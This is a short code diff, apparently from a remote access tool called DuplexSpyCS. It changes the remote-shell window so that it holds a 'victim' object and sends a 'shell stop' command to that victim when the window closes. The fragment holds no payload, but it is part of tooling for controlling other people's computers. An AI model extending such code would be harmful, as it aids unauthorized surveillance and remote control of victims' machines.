@@ -21,10 +21,12 @@ namespace DuplexSpyCS
 
         public string init_path;
 
-        public frmShell(string init_path = ".")
+        public frmShell(clsVictim victim, string init_path = ".")
         {
-            this.init_path = init_path;
             InitializeComponent();
+
+            this.init_path = init_path;
+            v = victim;
         }
 
         private void tbSelectLast()
@@ -334,6 +336,15 @@ namespace DuplexSpyCS
             }
 
             File.WriteAllText(szFileName, string.Empty);
+        }
+
+        private void frmShell_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            v.fnSendCommand(new string[]
+            {
+                "shell",
+                "stop",
+            });
         }
     }
 }
